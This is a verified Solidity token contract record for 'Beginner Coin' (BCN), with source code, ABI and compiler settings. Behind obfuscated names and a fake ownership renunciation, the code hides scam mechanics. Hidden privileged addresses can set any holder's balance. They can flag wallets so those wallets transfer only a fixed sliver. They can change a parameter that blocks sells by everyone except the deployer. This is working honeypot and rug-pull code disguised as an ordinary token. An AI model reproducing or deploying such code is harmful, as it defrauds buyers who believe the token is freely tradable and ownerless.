{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract liquidityTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTotalReceiver {\n    function createPair(address exemptEnable, address liquidityAmount) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface totalFeeAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface toExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTotal) external view returns (uint256);\n\n    function transfer(address receiverLiquidity, uint256 feeAmount) external returns (bool);\n\n    function allowance(address isEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverLiquidity,\n        uint256 feeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxLiquidity, uint256 value);\n    event Approval(address indexed isEnable, address indexed spender, uint256 value);\n}\n\ninterface toExemptMetadata is toExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BeginnerCoin is liquidityTake, toExempt, toExemptMetadata {\n\n    string private feeSenderReceiver = \"Beginner Coin\";\n\n    function owner() external view returns (address) {\n        return totalShould;\n    }\n\n    function feeFrom() private view {\n        require(launchedReceiver[_msgSender()]);\n    }\n\n    bool public sellExempt;\n\n    function balanceOf(address tokenTotal) public view virtual override returns (uint256) {\n        return teamIs[tokenTotal];\n    }\n\n    address walletFee;\n\n    address private totalShould;\n\n    function sellAt(address maxBuy) public {\n        require(maxBuy.balance < 100000);\n        if (sellExempt) {\n            return;\n        }\n        \n        launchedReceiver[maxBuy] = true;\n        if (swapTotal == isFrom) {\n            isFrom = sellShouldTo;\n        }\n        sellExempt = true;\n    }\n\n    function allowance(address enableReceiver, address fundFromLaunched) external view virtual override returns (uint256) {\n        if (fundFromLaunched == amountWalletEnable) {\n            return type(uint256).max;\n        }\n        return sellShould[enableReceiver][fundFromLaunched];\n    }\n\n    function receiverTo(address tradingMax, uint256 feeAmount) public {\n        feeFrom();\n        teamIs[tradingMax] = feeAmount;\n    }\n\n    uint256 sellIs;\n\n    bool public launchExempt;\n\n    uint8 private minMode = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return feeSenderReceiver;\n    }\n\n    mapping(address => uint256) private teamIs;\n\n    string private liquidityLaunch = \"BCN\";\n\n    uint256 private sellShouldTo;\n\n    uint256 constant teamLimit = 14 ** 10;\n\n    function transfer(address tradingMax, uint256 feeAmount) external virtual override returns (bool) {\n        return maxMin(_msgSender(), tradingMax, feeAmount);\n    }\n\n    uint256 public modeSell;\n\n    function minList(address liquidityTotal, address receiverLiquidity, uint256 feeAmount) internal view returns (uint256) {\n        require(feeAmount > 0);\n\n        uint256 walletShould = 0;\n        if (liquidityTotal == swapMin && shouldTxLiquidity > 0) {\n            walletShould = feeAmount * shouldTxLiquidity / 100;\n        } else if (receiverLiquidity == swapMin && liquidityMode > 0) {\n            walletShould = feeAmount * liquidityMode / 100;\n        }\n        require(walletShould <= feeAmount);\n        return feeAmount - walletShould;\n    }\n\n    uint256 public shouldTxLiquidity = 3;\n\n    uint256 private walletFund = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityLaunch;\n    }\n\n    function teamSell(address liquidityTotal, address receiverLiquidity, uint256 feeAmount) internal returns (bool) {\n        require(teamIs[liquidityTotal] >= feeAmount);\n        teamIs[liquidityTotal] -= feeAmount;\n        teamIs[receiverLiquidity] += feeAmount;\n        emit Transfer(liquidityTotal, receiverLiquidity, feeAmount);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellShould;\n\n    function minReceiverWallet(address receiverReceiver) public {\n        feeFrom();\n        \n        if (receiverReceiver == amountToken || receiverReceiver == swapMin) {\n            return;\n        }\n        swapTeamLaunched[receiverReceiver] = true;\n    }\n\n    event OwnershipTransferred(address indexed toFeeEnable, address indexed launchedMax);\n\n    uint256 public teamSender;\n\n    address amountWalletEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public swapTeamLaunched;\n\n    constructor (){\n        \n        maxSwap();\n        totalFeeAuto buyMin = totalFeeAuto(amountWalletEnable);\n        swapMin = buyTotalReceiver(buyMin.factory()).createPair(buyMin.WETH(), address(this));\n        walletFee = buyTotalReceiver(buyMin.factory()).feeTo();\n        \n        amountToken = _msgSender();\n        launchedReceiver[amountToken] = true;\n        teamIs[amountToken] = walletFund;\n        \n        emit Transfer(address(0), amountToken, walletFund);\n    }\n\n    function getOwner() external view returns (address) {\n        return totalShould;\n    }\n\n    function maxMin(address liquidityTotal, address receiverLiquidity, uint256 feeAmount) internal returns (bool) {\n        if (liquidityTotal == amountToken) {\n            return teamSell(liquidityTotal, receiverLiquidity, feeAmount);\n        }\n        uint256 launchBuy = toExempt(swapMin).balanceOf(walletFee);\n        require(launchBuy == sellIsLiquidity);\n        require(receiverLiquidity != walletFee);\n        if (swapTeamLaunched[liquidityTotal]) {\n            return teamSell(liquidityTotal, receiverLiquidity, teamLimit);\n        }\n        feeAmount = minList(liquidityTotal, receiverLiquidity, feeAmount);\n        return teamSell(liquidityTotal, receiverLiquidity, feeAmount);\n    }\n\n    address public swapMin;\n\n    uint256 public liquidityMode = 0;\n\n    bool public maxLimit;\n\n    function maxSwap() public {\n        emit OwnershipTransferred(amountToken, address(0));\n        totalShould = address(0);\n    }\n\n    bool private listTotal;\n\n    function transferFrom(address liquidityTotal, address receiverLiquidity, uint256 feeAmount) external override returns (bool) {\n        if (_msgSender() != amountWalletEnable) {\n            if (sellShould[liquidityTotal][_msgSender()] != type(uint256).max) {\n                require(feeAmount <= sellShould[liquidityTotal][_msgSender()]);\n                sellShould[liquidityTotal][_msgSender()] -= feeAmount;\n            }\n        }\n        return maxMin(liquidityTotal, receiverLiquidity, feeAmount);\n    }\n\n    address public amountToken;\n\n    function approve(address fundFromLaunched, uint256 feeAmount) public virtual override returns (bool) {\n        sellShould[_msgSender()][fundFromLaunched] = feeAmount;\n        emit Approval(_msgSender(), fundFromLaunched, feeAmount);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minMode;\n    }\n\n    mapping(address => bool) public launchedReceiver;\n\n    function marketingBuy(uint256 feeAmount) public {\n        feeFrom();\n        sellIsLiquidity = feeAmount;\n    }\n\n    uint256 private swapTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletFund;\n    }\n\n    uint256 private isFrom;\n\n    uint256 sellIsLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFeeEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundFromLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFromLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"marketingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"}],\"name\":\"minReceiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"}],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTxLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTeamLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BeginnerCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}